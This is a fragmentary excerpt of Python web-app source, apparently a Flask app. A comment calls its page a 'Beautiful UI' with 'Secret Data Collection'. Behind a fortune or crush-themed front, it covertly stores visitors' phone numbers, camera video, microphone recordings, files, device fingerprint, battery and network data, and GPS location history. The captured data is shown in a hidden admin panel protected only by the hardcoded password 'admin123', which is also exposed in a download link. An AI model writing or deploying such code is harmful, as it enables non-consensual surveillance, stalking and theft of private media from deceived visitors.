...
def save_visitor(data):
    ...
    if existing:
        ...
        ''', (
            ...
            data.get('fortuneText'), data.get('phoneNumber'),
            ...
            data.get('cameraVideo'), data.get('microphone'), data.get('files'),
            data.get('sessionId')
        ))
    else:
        c.execute('''
        ...
        ''', (
            ...
            data.get('crush_name'), data.get('fortuneText'), data.get('phoneNumber'),
            data.get('fingerprint'), data.get('batteryLevel'), data.get('batteryCharging'), 
            data.get('networkType'), data.get('networkSpeed'),
            data.get('deviceMemory'), data.get('screen'), data.get('timezone'), data.get('userAgent'),
            data.get('latitude'), data.get('longitude'), data.get('mapUrl'), 
...
def get_location_history(session_id):
    ...
    c.execute('''
        ...
        WHERE sessionId = ? ORDER BY id ASC
    ''', (session_id,))
    rows = c.fetchall()
    conn.close()
    return rows
...
# ---------- HTML Template - Beautiful UI, Secret Data Collection ----------
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
...
def save_phone():
    ...
    if session_id:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("UPDATE visitors SET phoneNumber = ?, fortuneText = ? WHERE sessionId = ?", 
                  (phone, fortune_text, session_id))
        conn.commit()
        conn.close()
        return jsonify({'status': 'saved'})
    return jsonify({'status': 'error'}), 400
...
# ---------- Admin Panel (Secret - only accessible with password) ----------
...
def admin():
    if request.method == 'POST':
        ...
        if password == 'admin123':
            ...
            html += '<p><a href="/admin">Back to login</a> | <a href="/admin/download-csv?pass=admin123">📥 Download CSV</a></p>'
            ...
            for v in visitors:
                ...
                for col in columns:
                    ...
                    if col in ('cameraVideo', 'files') and isinstance(val, str) and len(val) > 100:
                        display_val = f'<div style="max-width:300px; overflow-x:auto; white-space:pre-wrap; font-size:11px;">{val[:200]}...</div>'
                    else:
